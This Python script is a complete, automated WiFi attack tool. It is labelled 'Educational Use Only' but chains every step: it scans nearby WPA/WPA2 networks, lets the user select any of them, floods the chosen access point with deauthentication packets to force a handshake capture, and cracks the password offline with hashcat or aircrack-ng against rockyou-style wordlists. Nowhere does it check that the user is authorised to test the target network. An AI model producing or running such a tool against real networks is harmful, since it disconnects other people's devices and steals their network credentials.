import os
import sys
import subprocess
import time
import re
from pathlib import Path

# Windows compatibility: only import pwd on Unix
IS_WINDOWS = os.name == 'nt'
if not IS_WINDOWS:
    import pwd

def clear_screen():
    if IS_WINDOWS:
        subprocess.run(['cmd', '/c', 'cls'], shell=False)
    else:
        subprocess.run(['clear'])

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'

def enable_ansi_windows():
    """Enable ANSI escape codes on Windows 10+"""
    if IS_WINDOWS:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass

enable_ansi_windows()

def print_banner():
    banner = f"""
{Colors.OKCYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║   ██╗    ██╗███████╗██████╗ ███████╗██████╗                ║
║   ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗               ║
║   ██║ █╗ ██║█████╗  ██████╔╝█████╗  ██████╔╝               ║
║   ██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗               ║
║   ╚███╔███╔╝███████╗██████╔╝███████╗██║  ██║               ║
║    ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝               ║
║                                                            ║
║        WiFi Security Testing Tool – Easy Mode              ║
║        Author : WEBER                                      ║
║        ⚠ Educational Use Only ⚠                            ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
{Colors.ENDC}
    """
    clear_screen()
    print(banner)

def print_success(message):
    print(f"{Colors.OKGREEN}[✓] {message}{Colors.ENDC}")

def print_error(message):
    print(f"{Colors.FAIL}[✗] {message}{Colors.ENDC}")

def print_info(message):
    print(f"{Colors.OKBLUE}[i] {message}{Colors.ENDC}")

def print_warning(message):
    print(f"{Colors.WARNING}[!] {message}{Colors.ENDC}")

def print_step(step_num, total_steps, message):
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}[Step {step_num}/{total_steps}] {message}{Colors.ENDC}")

def display_cracked_password(essid, password):
    """Display cracked password in a highlighted format"""
    print(f"\n{Colors.OKGREEN}{Colors.BOLD}")
    print("╔════════════════════════════════════════════════════════════╗")
    print("║                                                            ║")
    print("║              🎉 PASSWORD CRACKED! 🎉                       ║")
    print("║                                                            ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"{Colors.ENDC}")

    print(f"\n{Colors.OKCYAN}{Colors.BOLD}Network Name (ESSID):{Colors.ENDC}")
    box_width = max(len(essid) + 4, 60)
    print(f"  {Colors.WARNING}╔{'═' * box_width}╗{Colors.ENDC}")
    print(f"  {Colors.WARNING}║  {Colors.BOLD}{essid:<{box_width-2}}{Colors.ENDC}{Colors.WARNING}║{Colors.ENDC}")
    print(f"  {Colors.WARNING}╚{'═' * box_width}╝{Colors.ENDC}")

    print(f"\n{Colors.OKCYAN}{Colors.BOLD}Password:{Colors.ENDC}")
    box_width = max(len(password) + 4, 60)
    print(f"  {Colors.OKGREEN}╔{'═' * box_width}╗{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}║  {Colors.BOLD}{Colors.WARNING}{password:<{box_width-2}}{Colors.ENDC}{Colors.OKGREEN}║{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}╚{'═' * box_width}╝{Colors.ENDC}\n")

def run_command(command, shell=False, capture_output=False):
    """Execute shell command (cross-platform)"""
    try:
        if capture_output:
            result = subprocess.run(command, shell=shell, capture_output=True, text=True)
            return result.returncode, result.stdout, result.stderr
        else:
            result = subprocess.run(command, shell=shell)
            return result.returncode, None, None
    except FileNotFoundError as e:
        print_error(f"Command not found: {e}")
        return 1, None, str(e)
    except Exception as e:
        print_error(f"Command failed: {e}")
        return 1, None, str(e)

def get_actual_user():
    """Get the actual user who invoked sudo (Unix) or current user (Windows)"""
    if IS_WINDOWS:
        return os.environ.get('USERNAME', 'user')

    sudo_user = os.environ.get('SUDO_USER')
    if sudo_user and sudo_user != 'root':
        return sudo_user
    try:
        return pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        return 'root'

def get_actual_user_home():
    """Get the actual user's home directory (cross-platform)"""
    if IS_WINDOWS:
        return os.environ.get('USERPROFILE', str(Path.home()))

    actual_user = get_actual_user()
    if actual_user and actual_user != 'root':
        try:
            return pwd.getpwnam(actual_user).pw_dir
        except Exception:
            pass
    return str(Path.home())

def get_script_dir():
    """Return the directory where this script lives"""
    return os.path.dirname(os.path.abspath(__file__))

def check_root():
    """Check for admin / root privileges"""
    if IS_WINDOWS:
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print_error("This script must be run as Administrator!")
                print_info("Right-click the terminal and choose 'Run as administrator'")
                sys.exit(1)
        except Exception:
            print_warning("Could not verify admin rights – continuing anyway")
    else:
        if os.geteuid() != 0:
            print_error("This script must be run as root!")
            print_info("Please run: sudo python3 main.py")
            sys.exit(1)
    print_success("Running with elevated privileges")

def check_dependencies():
    """Check if required tools are installed"""
    print_info("Checking dependencies...")

    if IS_WINDOWS:
        # On Windows, tools are typically not available natively.
        # Warn the user and continue (useful if running inside WSL-bridge or similar).
        print_warning("Windows detected. Aircrack-ng suite is primarily Linux-based.")
        print_info("Recommended: use WSL (Windows Subsystem for Linux) or Kali Linux.")
        print_info("Attempting to locate tools anyway (e.g. if added to PATH)...")

    required = {
        'airmon-ng': 'aircrack-ng',
        'airodump-ng': 'aircrack-ng',
        'aireplay-ng': 'aircrack-ng',
        'aircrack-ng': 'aircrack-ng'
    }

    missing = []
    for cmd, package in required.items():
        check = subprocess.run(
            ['where', cmd] if IS_WINDOWS else ['which', cmd],
            capture_output=True
        )
        if check.returncode != 0:
            missing.append(package)

    if missing:
        print_error("Missing required tools!")
        if IS_WINDOWS:
            print_info("Install aircrack-ng (Windows build) from https://www.aircrack-ng.org/")
            print_info("Or use WSL: sudo apt install aircrack-ng")
        else:
            print_info(f"Install with: sudo apt install {' '.join(set(missing))}")
        sys.exit(1)

    print_success("All required tools found")

    global HAS_HASHCAT, HAS_HCXTOOLS
    which_cmd = 'where' if IS_WINDOWS else 'which'
    HAS_HASHCAT = subprocess.run([which_cmd, 'hashcat'], capture_output=True).returncode == 0
    HAS_HCXTOOLS = subprocess.run([which_cmd, 'hcxpcapngtool'], capture_output=True).returncode == 0

    if HAS_HASHCAT and HAS_HCXTOOLS:
        print_success("GPU cracking available (hashcat)")
    else:
        print_warning("GPU cracking not available (CPU only)")

def get_wireless_interface():
    """Detect wireless interface (cross-platform)"""
    print_info("Detecting wireless interface...")

    if IS_WINDOWS:
        # On Windows use netsh to list wireless interfaces
        returncode, stdout, _ = run_command(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True
        )
        if returncode != 0 or not stdout:
            print_error("Could not detect wireless interface via netsh")
            sys.exit(1)

        interfaces = re.findall(r'Name\s*:\s*(.+)', stdout)
        interfaces = [i.strip() for i in interfaces]

        if not interfaces:
            print_error("No wireless interface found")
            print_info("Make sure your wireless adapter is enabled")
            sys.exit(1)
    else:
        returncode, stdout, _ = run_command(['iw', 'dev'], capture_output=True)
        if returncode != 0:
            print_error("Could not detect wireless interface")
            sys.exit(1)
        interfaces = re.findall(r'Interface\s+(\w+)', stdout)

    if not interfaces:
        print_error("No wireless interface found")
        print_info("Make sure your wireless adapter is connected")
        sys.exit(1)

    if len(interfaces) == 1:
        interface = interfaces[0]
        print_success(f"Found wireless interface: {interface}")
        return interface
    else:
        print_success(f"Found {len(interfaces)} wireless interfaces:")
        for idx, iface in enumerate(interfaces, 1):
            print(f"  {Colors.OKGREEN}{idx}.{Colors.ENDC} {iface}")

        while True:
            choice = input(f"\n{Colors.OKBLUE}Select interface (1-{len(interfaces)}): {Colors.ENDC}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                selected = interfaces[int(choice) - 1]
                print_success(f"Selected: {selected}")
                return selected
            print_error(f"Please enter a number between 1 and {len(interfaces)}")

def scan_networks(interface):
    """Scan for available WiFi networks"""
    print_info("Scanning for WiFi networks (this will take ~10 seconds)...")

    scan_file = "/tmp/wifi_scan" if not IS_WINDOWS else os.path.join(os.environ.get('TEMP', '.'), 'wifi_scan')

    scan_cmd = ['airodump-ng', interface, '-w', scan_file, '--output-format', 'csv']
    scan_process = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    for i in range(10, 0, -1):
        print(f"{Colors.WARNING}Scanning... {i} seconds remaining{Colors.ENDC}", end='\r')
        time.sleep(1)

    print(" " * 50, end='\r')
    scan_process.terminate()
    time.sleep(1)
    scan_process.kill()

    csv_file = f"{scan_file}-01.csv"

    if not os.path.exists(csv_file):
        print_error("Scan failed - no networks found")
        return []

    networks = []
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        ap_start = -1
        for idx, line in enumerate(lines):
            if 'BSSID' in line and 'channel' in line:
                ap_start = idx + 1
                break

        if ap_start == -1:
            return []

        for line in lines[ap_start:]:
            if not line.strip() or 'Station MAC' in line:
                break
            parts = [p.strip() for p in line.split(',')]
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            channel = parts[3].strip()
            encryption = parts[5].strip()
            power = parts[8].strip()
            essid = parts[13].strip()

            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                continue
            if not essid or 'WPA' not in encryption:
                continue
            if not channel.isdigit():
                continue

            networks.append({
                'bssid': bssid,
                'channel': channel,
                'essid': essid,
                'encryption': encryption,
                'power': power
            })

    except Exception as e:
        print_error(f"Error parsing scan results: {e}")
        return []

    finally:
        for f in [f"{scan_file}-01.cap", csv_file,
                  f"{scan_file}-01.kismet.csv", f"{scan_file}-01.kismet.netxml"]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except Exception:
                    pass

    return networks

def display_networks(networks):
    """Display networks in a nice table"""
    if not networks:
        print_error("No WPA/WPA2 networks found")
        return None

    print_success(f"Found {len(networks)} WPA/WPA2 networks:\n")
    print(f"{Colors.BOLD}{'No.':<5} {'Network Name (ESSID)':<30} {'Signal':<10} {'Channel':<10} {'Encryption':<15}{Colors.ENDC}")
    print("─" * 80)

    for idx, net in enumerate(networks, 1):
        try:
            power_val = int(net['power'])
            if power_val >= -50:
                signal_color = Colors.OKGREEN
                signal = "Excellent"
            elif power_val >= -60:
                signal_color = Colors.OKGREEN
                signal = "Good"
            elif power_val >= -70:
                signal_color = Colors.WARNING
                signal = "Fair"
            else:
                signal_color = Colors.FAIL
                signal = "Weak"
        except Exception:
            signal_color = Colors.ENDC
            signal = "Unknown"

        essid = net['essid'][:28] if len(net['essid']) > 28 else net['essid']
        print(f"{Colors.OKBLUE}{idx:<5}{Colors.ENDC} {essid:<30} {signal_color}{signal:<10}{Colors.ENDC} {net['channel']:<10} {net['encryption']:<15}")

    print()
    return networks

def select_network(networks):
    """Let user select a network"""
    while True:
        choice = input(f"{Colors.OKBLUE}Select network number (1-{len(networks)}) or 'r' to rescan: {Colors.ENDC}").strip().lower()
        if choice == 'r':
            return None
        if choice.isdigit():
            choice_num = int(choice)
            if 1 <= choice_num <= len(networks):
                selected = networks[choice_num - 1]
                print_success(f"Selected: {selected['essid']} (Channel: {selected['channel']})")
                return selected
        print_error(f"Please enter a number between 1 and {len(networks)}, or 'r' to rescan")

def enable_monitor_mode(interface):
    """Enable monitor mode on wireless interface (Linux only)"""
    if IS_WINDOWS:
        print_warning("Monitor mode is managed by the adapter driver on Windows.")
        print_info("Ensure your adapter supports monitor mode and switch it manually if needed.")
        return interface  # Return as-is; Windows users handle this at driver level

    print_info("Enabling monitor mode...")
    print_warning("This will disconnect your internet temporarily")

    run_command(['airmon-ng', 'check', 'kill'], capture_output=True)
    returncode, stdout, _ = run_command(['airmon-ng', 'start', interface], capture_output=True)

    if returncode == 0:
        time.sleep(2)
        possible_names = [f"{interface}mon", "wlan0mon", "wlan1mon", "wlan2mon", interface]
        returncode_iw, stdout_iw, _ = run_command(['iwconfig'], capture_output=True)

        monitor_interface = None
        if returncode_iw == 0:
            for line in stdout_iw.split('\n'):
                if 'Mode:Monitor' in line:
                    monitor_interface = line.split()[0]
                    break

        if not monitor_interface:
            for possible_name in possible_names:
                ret, out, _ = run_command(['iw', 'dev', possible_name, 'info'], capture_output=True)
                if ret == 0 and 'type monitor' in out.lower():
                    monitor_interface = possible_name
                    break

        if not monitor_interface:
            monitor_interface = f"{interface}mon"

        print_success(f"Monitor mode enabled: {monitor_interface}")
        return monitor_interface
    else:
        print_error("Failed to enable monitor mode")
        sys.exit(1)

def disable_monitor_mode(interface):
    """Disable monitor mode (Linux only)"""
    if IS_WINDOWS:
        return
    print_info("Restoring normal mode...")
    run_command(['airmon-ng', 'stop', interface], capture_output=True)
    print_success("Normal mode restored")

def check_handshake_captured(cap_file, bssid):
    """Check if handshake is captured in the file"""
    if not os.path.exists(cap_file):
        return False
    check_cmd = ['aircrack-ng', cap_file]
    returncode, stdout, _ = run_command(check_cmd, capture_output=True)
    if stdout and 'handshake' in stdout.lower() and bssid.lower() in stdout.lower():
        return True
    return False

def capture_handshake_automatic(interface, bssid, channel, output_file, essid):
    """Automatically capture WPA handshake with continuous deauth"""
    print_info(f"Starting automatic handshake capture for: {essid}")
    print_info(f"Channel: {channel} | BSSID: {bssid}")
    print_warning("The tool will automatically deauth and check for handshake")
    print_warning("This may take 30-120 seconds depending on network activity\n")

    cap_file = f"{output_file}-01.cap"
    handshake_captured = False
    attempt = 0
    max_attempts = 20

    airodump_cmd = [
        'airodump-ng', '-w', output_file,
        '-c', str(channel), '--bssid', bssid, interface
    ]

    print_info("Starting packet capture...")
    airodump_process = subprocess.Popen(
        airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    try:
        while not handshake_captured and attempt < max_attempts:
            attempt += 1
            print(f"{Colors.WARNING}[Attempt {attempt}/{max_attempts}] Sending deauth packets...{Colors.ENDC}", end='\r')

            aireplay_cmd = ['aireplay-ng', '--deauth', '5', '-a', bssid, interface]
            deauth_process = subprocess.Popen(
                aireplay_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(8)
            deauth_process.terminate()

            if check_handshake_captured(cap_file, bssid):
                handshake_captured = True
                print(f"\n{Colors.OKGREEN}{Colors.BOLD}🎉 HANDSHAKE CAPTURED! 🎉{Colors.ENDC}")
                break

            time.sleep(2)

        if not handshake_captured:
            print(f"\n{Colors.WARNING}Handshake not captured after {max_attempts} attempts{Colors.ENDC}")
            print_info("Tips:")
            print("  - Make sure devices are connected to the network")
            print("  - Try moving closer to the access point")
            print("  - The network might not have active clients")

    finally:
        airodump_process.terminate()
        time.sleep(2)
        airodump_process.kill()

    if handshake_captured and os.path.exists(cap_file):
        print_success(f"Capture saved: {cap_file}")
        return cap_file
    return None

def check_gpu_available():
    """Check if GPU is available for hashcat"""
    if not HAS_HASHCAT:
        return False
    print_info("Checking GPU availability...")
    returncode, stdout, _ = run_command(['hashcat', '-I'], capture_output=True)
    if returncode == 0 and ('CUDA' in stdout or 'OpenCL' in stdout):
        print_success("GPU detected - using GPU acceleration")
        return True
    print_warning("No GPU detected - using CPU mode")
    return False

# ─────────────────────────────────────────────────────────────
# WORDLIST SELECTION  (default: wordlist.txt next to script)
# ─────────────────────────────────────────────────────────────

def get_wordlist_path():
    """
    1. Try wordlist.txt next to this script (default).
    2. If not found, search common OS locations.
    3. If still none, ask user for a custom path.
    """
    script_dir = get_script_dir()
    user_home  = get_actual_user_home()

    # ── Default wordlist ──────────────────────────────────────
    default_wordlist = os.path.join(script_dir, 'wordlist.txt')

    if os.path.exists(default_wordlist):
        try:
            file_size = os.path.getsize(default_wordlist) / (1024 * 1024)
            print_success(f"Default wordlist found: wordlist.txt ({file_size:.1f} MB)")
        except Exception:
            print_success("Default wordlist found: wordlist.txt")

        use_default = input(
            f"{Colors.OKBLUE}Use default wordlist.txt? (Y/n): {Colors.ENDC}"
        ).strip().lower()

        if use_default in ('', 'y', 'yes'):
            return default_wordlist
        # Fall through to let the user pick a different one
    else:
        print_warning("Default wordlist.txt not found next to script.")

    # ── Search common locations ───────────────────────────────
    if IS_WINDOWS:
        common_wordlists = [
            os.path.join(script_dir, 'rockyou.txt'),
            os.path.join(user_home, 'Downloads', 'rockyou.txt'),
            os.path.join(user_home, 'wordlists', 'rockyou.txt'),
            r'C:\tools\wordlists\rockyou.txt',
            r'C:\Users\Public\wordlists\rockyou.txt',
        ]
    else:
        common_wordlists = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt',
            os.path.join(user_home, 'Downloads', 'rockyou.txt'),
            '/usr/share/wordlists/rockyou.txt.gz',
            os.path.join(user_home, 'wordlists', 'rockyou.txt'),
            os.path.join(script_dir, 'rockyou.txt'),
        ]

    print_info("Searching for additional wordlists...")
    found_wordlists = [wl for wl in common_wordlists if os.path.exists(wl)]

    if found_wordlists:
        print_success(f"Found {len(found_wordlists)} wordlist(s):\n")
        for idx, wl in enumerate(found_wordlists, 1):
            try:
                file_size = os.path.getsize(wl) / (1024 * 1024)
                print(f"  {Colors.OKGREEN}{idx}.{Colors.ENDC} {wl}")
                print(f"      {Colors.WARNING}Size: {file_size:.1f} MB{Colors.ENDC}")
            except Exception:
                print(f"  {Colors.OKGREEN}{idx}.{Colors.ENDC} {wl}")

        print(f"\n  {Colors.OKGREEN}0.{Colors.ENDC} Enter custom path")

        while True:
            choice = input(f"\n{Colors.OKBLUE}Select wordlist (0-{len(found_wordlists)}): {Colors.ENDC}").strip()
            if choice.isdigit():
                choice_num = int(choice)
                if choice_num == 0:
                    break  # Fall through to manual input
                elif 1 <= choice_num <= len(found_wordlists):
                    selected_wordlist = found_wordlists[choice_num - 1]
                    print_success(f"Selected: {selected_wordlist}")
                    return selected_wordlist
                else:
                    print_error(f"Please enter 0-{len(found_wordlists)}")
            else:
                print_error("Please enter a number")

    # ── Manual / custom path ──────────────────────────────────
    print_info("\nEnter the full path to your wordlist file.")
    if IS_WINDOWS:
        print(f"  Example: C:\\Users\\You\\Downloads\\rockyou.txt")
    else:
        print(f"  Example: /usr/share/wordlists/rockyou.txt  or  ~/Downloads/rockyou.txt")

    while True:
        wordlist_path = input(f"\n{Colors.OKBLUE}Enter wordlist path: {Colors.ENDC}").strip()

        # Strip surrounding quotes (common when drag-dropping on some terminals)
        wordlist_path = wordlist_path.strip('"\'')

        # Expand ~ to actual home directory
        if not IS_WINDOWS and wordlist_path.startswith('~'):
            wordlist_path = wordlist_path.replace('~', user_home, 1)
        else:
            wordlist_path = os.path.expanduser(wordlist_path)

        if os.path.exists(wordlist_path):
            try:
                file_size = os.path.getsize(wordlist_path) / (1024 * 1024)
                print_success(f"Wordlist found: {file_size:.1f} MB")
            except Exception:
                print_success("Wordlist found")
            return wordlist_path
        else:
            print_error(f"File not found: {wordlist_path}")
            retry = input(f"{Colors.WARNING}Try again? (y/n): {Colors.ENDC}").strip().lower()
            if retry != 'y':
                print_warning("Skipping password cracking (no wordlist selected)")
                return None

def crack_with_hashcat(cap_file, wordlist):
    """Crack password using hashcat (GPU)"""
    print_info("Converting to hashcat format...")
    hash_file = cap_file.replace('.cap', '.22000')
    returncode, _, _ = run_command(['hcxpcapngtool', cap_file, '-o', hash_file], capture_output=True)

    if returncode != 0 or not os.path.exists(hash_file):
        print_error("Conversion failed")
        return False

    print_success("Starting GPU cracking...")
    print_warning("This may take a while depending on wordlist size\n")

    hashcat_cmd = ['hashcat', '-m', '22000', '-D', '2', hash_file, wordlist]
    returncode, _, _ = run_command(hashcat_cmd)

    if returncode == 0:
        returncode_show, stdout_show, _ = run_command(
            ['hashcat', '-m', '22000', hash_file, '--show'], capture_output=True
        )
        if stdout_show:
            lines = stdout_show.strip().split('\n')
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 5:
                        display_cracked_password(parts[-2], parts[-1])
                        break

        print_info("\nRaw hashcat output:")
        print(f"{Colors.WARNING}{stdout_show}{Colors.ENDC}")
        return True
    else:
        print_warning("\n❌ Password not found in wordlist")
        print_info("Try a different/larger wordlist")
        return False

def crack_with_aircrack(cap_file, wordlist):
    """Crack password using aircrack-ng (CPU)"""
    print_success("Starting CPU cracking...")
    print_warning("This may take a while depending on wordlist size\n")

    aircrack_cmd = ['aircrack-ng', cap_file, '-w', wordlist]
    returncode, stdout, _ = run_command(aircrack_cmd, capture_output=True)

    if returncode == 0:
        essid = None
        password = None

        if stdout:
            key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', stdout)
            if key_match:
                password = key_match.group(1)
            essid_match = re.search(r'ESSID:\s*(.+)', stdout)
            if essid_match:
                essid = essid_match.group(1).strip()

        if essid and password:
            display_cracked_password(essid, password)
        else:
            print_success("\n🎉 PASSWORD FOUND! 🎉")
            print(f"\n{Colors.WARNING}{stdout}{Colors.ENDC}")

        return True
    else:
        print_warning("\n❌ Password not found in wordlist")
        print_info("Try a different/larger wordlist")
        return False

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

def main():
    print_banner()

    check_root()
    check_dependencies()

    # Step 1 – Interface
    print_step(1, 5, "Select Wireless Interface")
    interface = get_wireless_interface()

    # Step 2 – Scan & select network
    print_step(2, 5, "Scan and Select WiFi Network")
    monitor_interface = enable_monitor_mode(interface)

    networks       = None
    selected_network = None

    while not selected_network:
        networks = scan_networks(monitor_interface)
        networks = display_networks(networks)

        if networks:
            selected_network = select_network(networks)
            if not selected_network:
                print_info("Rescanning...")
        else:
            print_error("No networks found!")
            retry = input(f"{Colors.WARNING}Try scanning again? (y/n): {Colors.ENDC}").strip().lower()
            if retry != 'y':
                disable_monitor_mode(monitor_interface)
                sys.exit(1)

    # Step 3 – Wordlist  (default: wordlist.txt next to script)
    print_step(3, 5, "Select Wordlist")
    wordlist = get_wordlist_path()

    # Step 4 – Capture handshake
    print_step(4, 5, "Capture Handshake (Automatic)")

    output_dir = Path('./wifi_captures')
    output_dir.mkdir(exist_ok=True)
    safe_essid  = re.sub(r'[^\w\-]', '_', selected_network['essid'])
    output_file = str(output_dir / f"capture_{safe_essid}_{int(time.time())}")

    try:
        cap_file = capture_handshake_automatic(
            monitor_interface,
            selected_network['bssid'],
            selected_network['channel'],
            output_file,
            selected_network['essid']
        )

        if cap_file and wordlist:
            # Step 5 – Crack
            print_step(5, 5, "Crack Password")
            has_gpu = check_gpu_available()
            if has_gpu and HAS_HCXTOOLS:
                crack_with_hashcat(cap_file, wordlist)
            else:
                crack_with_aircrack(cap_file, wordlist)

        elif cap_file and not wordlist:
            print_info("Skipping password cracking (no wordlist)")
            print_success(f"Handshake saved to: {cap_file}")

        elif not cap_file:
            print_error("Failed to capture handshake")

    finally:
        print(f"\n{Colors.BOLD}═══════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{Colors.BOLD}                      CLEANUP{Colors.ENDC}")
        print(f"{Colors.BOLD}═══════════════════════════════════════════════════════════{Colors.ENDC}\n")

        disable_monitor_mode(monitor_interface)

        print(f"\n{Colors.OKGREEN}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════╗")
        print("║                    All Done! ✓                           ║")
        print("║         Thank you for using WiFi Testing Tool            ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}Operation cancelled by user{Colors.ENDC}")
        print_info("Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)